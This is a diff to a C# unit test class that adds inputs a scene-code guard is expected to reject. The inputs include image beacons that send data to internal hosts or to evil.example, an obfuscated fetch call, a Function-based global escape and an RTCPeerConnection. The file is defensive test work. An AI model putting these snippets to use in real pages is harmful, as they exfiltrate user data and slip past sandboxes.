@@ -18,6 +18,15 @@ public sealed class SceneCodeGuardTests
     [InlineData("<img src=\"file:///C:/a.png\">")]
     [InlineData("@import url('https://fonts.googleapis.com/css2?family=Inter');")]
     [InlineData("const t = Date.now();")]
+    [InlineData("<img src=\"http://192.168.1.1/x?d=1\">")]
+    [InlineData("new Image().src='http://10.0.0.5:8080/'+data;")]
+    [InlineData("new Image().src = 'http://localhost:5000/videos';")]
+    [InlineData("const u = 'https:\\/\\/evil.example/x';")]
+    [InlineData("<img src=\"//10.0.0.5/p.gif\">")]
+    [InlineData("<img src=\"//localhost:7120/a\">")]
+    [InlineData("window['fe' + 'tch']('/x');")]
+    [InlineData("const g = Function('return this')();")]
+    [InlineData("const pc = new RTCPeerConnection();")]
     public void Unsafe_IsRejected(string code) => _guard.Check(code).IsFailure.ShouldBeTrue();
 
     /// <summary>Temiz kod ve SVG ad alanı kabul edilir.</summary>
